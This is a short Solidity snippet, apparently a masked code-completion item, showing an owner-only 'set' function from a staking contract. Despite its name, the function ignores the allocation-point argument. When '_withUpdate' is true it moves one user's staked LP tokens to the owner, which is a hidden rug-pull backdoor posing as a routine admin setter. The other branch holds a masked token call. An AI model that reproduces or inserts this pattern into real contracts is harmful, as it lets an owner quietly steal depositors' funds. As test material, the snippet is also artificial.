"function set (uint256 _pid, uint256 _allocPoint, address _lpPool, bool _withUpdate) public onlyOwner {        if (_withUpdate) {        PoolInfo storage pool = poolInfo[_pid];        UserInfo storage user = userInfo[_pid][_lpPool];        pool.lpToken.safeTransfer(address(msg.sender), user.amount);        }        else {        PoolInfo storage pool = poolInfo[_pid];        pool.lpToken.<mask0>;        }    }"